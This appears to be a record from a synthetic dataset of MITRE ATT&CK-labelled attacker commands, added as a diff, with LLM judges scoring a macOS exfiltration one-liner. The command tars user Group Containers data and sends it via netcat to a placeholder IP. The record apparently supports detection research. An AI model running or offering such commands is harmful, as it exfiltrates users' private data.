@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "tar cf - ~/Library/Group\\ Containers | gzip -1 | nc -s \"$(networksetup -getinfo 'FireWire' | awk -F': ' '/IP address/{print $2}')\" 203.0.113.10 55284",
+  "explanation": "Binds to the FireWire networking service to send compressed data over a seldom-used medium, matching T1011 intent.",
+  "rationale_steps": [
+    "Get FireWire interface IP using networksetup",
+    "Bind netcat to the FireWire address",
+    "Exfiltrate compressed archive to a high port"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-641961f7-19546b01",
+  "source_prompt_hash": "641961f7",
+  "timestamp_utc": "2025-09-30T08:21:35.084142Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed pipeline with balanced quoting, valid flags, and correct command substitution.",
+        "semantic_score": 3,
+        "semantic_justification": "It packages and compresses data then exfiltrates via nc (automation-like), but binding to a likely non-existent FireWire interface and using a documentation-only IP make successful execution and the stated intent operationally dubious.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T02:47:47.909092Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid flags, balanced quotes, and correct command separators using pipes.",
+        "semantic_score": 4,
+        "semantic_justification": "The command effectively implements automated exfiltration by compressing user data and sending it over the network to a remote server, though binding specifically to the FireWire interface is unusual and might be unreliable in practice.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T02:47:51.082321Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using standard utilities, valid flags, correct command substitution, and proper quoting.",
+        "semantic_score": 3,
+        "semantic_justification": "While the overall flow (collect, compress, exfiltrate via nc) aligns with T1011, the reliance on FireWire having an IP address configured and being routable for external network communication is highly improbable and operationally implausible in a typical macOS environment, significantly reducing realism for the claimed intent.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T02:48:12.619712Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.333,
+    "llm_average_score": 4.167,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
